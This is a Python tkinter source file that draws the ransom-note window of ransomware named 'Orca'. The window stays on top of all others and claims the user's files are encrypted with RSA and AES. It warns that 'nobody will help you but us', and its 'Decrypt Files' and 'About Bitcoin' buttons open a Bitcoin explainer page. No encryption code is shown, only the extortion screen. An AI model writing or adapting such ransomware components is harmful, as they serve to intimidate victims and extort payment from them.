import webbrowser
import tkinter as tk
from tkinter.ttk import Label, Button

class Face(tk.Tk):
    def __init__(self):
        super().__init__()

        self.title("Orca")
        ww, wh = 600, 500
        sw, sh = self.winfo_screenwidth(), self.winfo_screenheight()

        cx, cy = int(sw/2 - ww/2), int(sh/2 - wh/2)

        self.geometry(f'{ww}x{wh}+{cx}+{cy}')
        self.attributes('-topmost',1)
        self.configure(background='black')

        self.columnconfigure(0,weight=1)
        self.columnconfigure(0,weight=2)

        h = Label(
            self, 
            text="Your files have been encrypted by Orca.",
            font=('Arial',18),
            background='black',
            foreground='white')

        h.grid(column=1,row=0,sticky=tk.E,padx=5, pady=5)

        mi = Label(
            self, 
            text="More info...",
            background='black',
            foreground='white')

        mi.grid(column=0,row=1,sticky=tk.W,padx=5, pady=5)

        btc = Label(
            self, 
            text="About Bitcoin",
            background='black',
            foreground='blue',
            cursor='hand2')

        btc.bind("<Button-1>",lambda e:self.btc())

        btc.grid(column=0,row=2,sticky=tk.W,padx=5, pady=5)

        cnvs = tk.Canvas(self,width=450,height=350,bg='white')
        cnvs.grid(column=1,row=2,sticky=tk.E,padx=5, pady=5)

        cnvs.create_text(
            (190,10),
            text="All your important files have been encrypted with RSA and AES ciphers."
        )

        cnvs.create_text(
            (173,30),
            text="To decrypt your files please press the 'decrypt files' button below."
        )

        cnvs.create_text(
            (182,50),
            text="Warning! Nobody will help you but us. Let's work together, shall we?"
        )

        btn = Button(
            self,
            text='Decrypt Files',
            command=self.web
        )

        btn.grid(column=1,row=3,sticky=tk.E,padx=5, pady=5)

    def web(self):
       webbrowser.open_new_tab("https://www.investopedia.com/terms/b/bitcoin.asp#:~:text=Bitcoin%20(BTC)%20is%20a%20cryptocurrency,party%20involvement%20in%20financial%20transactions.")

    def btc(self):
        webbrowser.open_new_tab("https://www.investopedia.com/terms/b/bitcoin.asp#:~:text=Bitcoin%20(BTC)%20is%20a%20cryptocurrency,party%20involvement%20in%20financial%20transactions.")